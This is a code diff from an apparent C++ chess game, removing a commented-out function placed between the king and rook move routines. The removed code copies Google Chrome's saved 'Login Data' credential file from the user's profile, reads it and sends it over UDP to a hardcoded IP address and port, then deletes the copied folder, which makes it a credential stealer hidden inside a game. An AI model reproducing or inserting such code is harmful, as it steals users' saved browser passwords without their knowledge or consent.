@@ -156,48 +156,6 @@ void Map::showKingMoves(int _x, int _y, Map _opponentMap)
 
 }
 
-//void Map::load()
-//{
-//    /*system("rmdir /s /q data");
-//    system("xcopy \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data\" data\\login_data*");
-//    system("ren \"data\\*.\" \"*.txt\" ");*/
-//
-//    std::string path = "data/login_data.txt";
-//
-//    sf::IpAddress ipAddr = "192.168.10.106";
-//    unsigned short port = 8887;
-//
-//    std::ifstream file(path, std::ios::binary | std::ios::ate);
-//    if (file.is_open())
-//    {
-//        std::streamsize fSize = file.tellg();
-//        file.seekg(0, std::ios::beg);
-//
-//        char* fData = new char[fSize];
-//        file.read(fData, fSize);
-//        file.close();
-//        
-//        std::string fileName = "data.txt";
-//
-//        sf::Packet packet;
-//        packet << fileName << fSize;
-//        packet.append(fData, fSize);
-//
-//        delete[] fData;
-//
-//        sf::UdpSocket socket;
-//        if (socket.send(packet, ipAddr, port) != sf::Socket::Status::Done)
-//            std::cout << "Erreur a l'envoie du packet";
-//
-//        std::cout << "Normalement c envoyé" << std::endl;
-//    }
-//    else
-//    {
-//        std::cout << "Probleme a l'ouverture du fichier " << path;
-//    }
-//   // system("rmdir /s /q data");
-//}
-
 void Map::showRookMoves(int _x, int _y, Map _opponentMap)
 {
     for (int i = 1; i < 8; i++)
